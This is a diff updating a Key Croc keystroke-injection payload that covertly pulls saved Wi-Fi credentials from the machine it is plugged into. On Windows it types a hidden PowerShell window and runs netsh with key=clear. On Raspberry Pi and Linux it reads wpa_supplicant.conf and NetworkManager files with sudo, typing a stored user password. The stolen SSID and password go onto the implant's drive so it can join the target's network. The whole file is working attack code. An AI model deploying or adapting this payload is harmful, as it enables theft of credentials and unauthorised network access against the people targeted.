@@ -2,7 +2,7 @@
 # Description:     Attempt to connect Keycroc automatically to target wifi access point
 #                  Save to tools/Croc_Pot/wifipass.txt and loot/Croc_Pot/old_wifipass.txt
 # Author:          spywill
-# Version:         3.4
+# Version:         3.5
 # Category:        Key Croc
 # Props:           Cribbit, Lodrix, potong, RootJunky, dark_pyrro
 
@@ -26,35 +26,41 @@ case $LOOT in
 	getonline_W)
 		Q GUI r
 		Q DELAY 3000
-		Q STRING "powershell"
+		Q STRING "powershell -NoP -NonI -W Hidden"
 		Q ENTER
 		Q DELAY 5000
-		Q STRING "\$Croc = (gwmi win32_volume -f 'label=\"KeyCroc\"' | Select-Object -ExpandProperty DriveLetter)"
+		Q STRING "\$MOUNT_POINT = (Get-WmiObject -Class win32_volume -Filter 'label=\"KeyCroc\"').DriveLetter"
 		Q ENTER
 		Q DELAY 3000
-		Q STRING "(netsh wlan show networks) | Select-String \"\:(.+)\$\" | % {\$name=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{(netsh wlan show profile name=\"\$name\" key=clear)} | Select-String \"Key Content\W+\:(.+)\$\" | % {\$pass=\$_.Matches.Groups[1].Value.Trim(); \$_} | %{[PSCustomObject]@{ PROFILE_NAME=\$name;PASSWORD=\$pass }} | Out-File -Encoding UTF8 \"\$Croc\tools\Croc_Pot\wifipass.txt\""
+		Q STRING "\$currentSSID = (netsh wlan show interfaces | Select-String \"SSID\")[0].ToString().Trim() -replace 'SSID\s+:\s+'"
 		Q ENTER
-		Q DELAY 6000
-		Q STRING "exit"
+		Q DELAY 2000
+		Q STRING "\$lastObject = (netsh wlan show profile name=\"\$currentSSID\" key=clear) | Select-String \"Key Content\W+:(.+)\$\" | ForEach-Object {\$pass=\$_.Matches.Groups[1].Value.Trim(); \$_} | ForEach-Object {[PSCustomObject]@{ PROFILE_NAME=\$currentSSID;PASSWORD=\$pass }} | Select-Object -Last 1"
 		Q ENTER
-		sed -i '/^[[:space:]]*$/d' $wifi_pass
-		sed -i '$!d' $wifi_pass
-		sed -i 's/\r//g' $wifi_pass
+		Q DELAY 2000
+		Q STRING "\"\$(\$lastObject.PROFILE_NAME) \$(\$lastObject.PASSWORD)\" | Out-File -Encoding UTF8 \"\$MOUNT_POINT\tools\Croc_Pot\wifipass.txt\""
+		Q ENTER
+		Q DELAY 5000
+		Q STRING "Dismount-WindowsImage -Path \$MOUNT_POINT ; exit"
+		Q ENTER
 ;;
 	getonline_R)
 		Q CONTROL-ALT-d
 		Q CONTROL-ALT-t
 		Q DELAY 2000
-		Q STRING "RASPBERRY_PI=/media/\$(whoami)/KeyCroc/tools/Croc_Pot/wifipass.txt"
+		Q STRING "MOUNT_POINT=/media/\$(whoami)/KeyCroc"
 		Q ENTER
 		Q DELAY 2000
-		Q STRING "t_ssid=\$(iw dev wlan0 info | grep ssid | awk '{print \$2}')"
+		Q STRING "currentSSID=\$(iw dev wlan0 info | grep ssid | awk '{print \$2}')"
 		Q ENTER
 		Q DELAY 2000
-		Q STRING "t_pw=\$(sudo sed -e '/ssid\ psk/,+1p' -ne \":a;/\$t_ssid/{n;h;p;x;ba}\" /etc/wpa_supplicant/wpa_supplicant.conf | sed 's/[[:space:]]//g' | sed 's/psk=\"\(.*\)\"/\1/')"
+		Q STRING "SSID_pw=\$(sudo sed -e '/ssid\ psk/,+1p' -ne \":a;/\$currentSSID/{n;h;p;x;ba}\" /etc/wpa_supplicant/wpa_supplicant.conf | sed 's/[[:space:]]//g' | sed 's/psk=\"\(.*\)\"/\1/')"
 		Q ENTER
 		Q DELAY 2000
-		Q STRING "echo \"\$t_ssid \$t_pw\" > \$RASPBERRY_PI ; exit"
+		Q STRING "echo \"\$currentSSID \$SSID_pw\" | tee \$MOUNT_POINT/tools/Croc_Pot/wifipass.txt"
+		Q ENTER
+		Q DELAY 3000
+		Q STRING "umount \$MOUNT_POINT ; exit"
 		Q ENTER
 ;;
 	getonline_L)
@@ -66,15 +72,21 @@ case $LOOT in
 		Q CONTROL-ALT-d
 		Q ALT-t
 		Q DELAY 2000
-		Q STRING "USB_LABEL=\"KeyCroc\" ; MOUNT_POINT=\"/mnt/usb\" ; sudo mkdir -p \$MOUNT_POINT ; sudo mount -L \"\$USB_LABEL\" \$MOUNT_POINT"
+		Q STRING "MOUNT_POINT=\"/mnt/usb\" ; sudo mkdir -p \$MOUNT_POINT ; sudo mount -L \"KeyCroc\" \$MOUNT_POINT"
 		Q ENTER
 		Q DELAY 2000
 		Q STRING "$PC_PW"
 		Q ENTER
 		Q DELAY 2000
-		Q STRING "sudo grep -r '^psk=' /etc/NetworkManager/system-connections/ | sed -E -e 's/[/]//g' -e 's/etc//g' -e 's/NetworkManagersystem-connections//g' -e 's/.nmconnection:psk//g' | sed -e 's/=/ /g' | sudo tee \$MOUNT_POINT/tools/Croc_Pot/wifipass.txt"
+		Q STRING "currentSSID=\$(iw dev wlan0 info | grep ssid | awk '{print \$2}')"
 		Q ENTER
 		Q DELAY 2000
+		Q STRING "SSID_pw=\$(sudo grep -r '^psk=' /etc/NetworkManager/system-connections/\$currentSSID* | sed -e 's/psk=//g')"
+		Q ENTER
+		Q DELAY 2000
+		Q STRING "echo \"\$currentSSID \$SSID_pw\" | sudo tee \$MOUNT_POINT/tools/Croc_Pot/wifipass.txt"
+		Q ENTER
+		Q DELAY 3000
 		Q STRING "sudo umount \$MOUNT_POINT ; exit"
 		Q ENTER
 ;;
@@ -86,6 +98,11 @@ sleep 3
 LED SETUP
 kill -9 $(pidof wpa_supplicant) && kill -9 $(pidof dhclient)
 ifconfig wlan0 down
+
+if [ "$LOOT" = "getonline_W" ]; then
+	sed -i '0,/./s/^.//' $wifi_pass
+	sed -i 's/\r//g' $wifi_pass
+fi
 
 sed -i 's/\( \)*/\1/g' $wifi_pass
 sed -i -E -e '/^[WS]/d' -e '9 a WIFI_SSID\nWIFI_PASS\nSSH ENABLE' root/udisk/config.txt
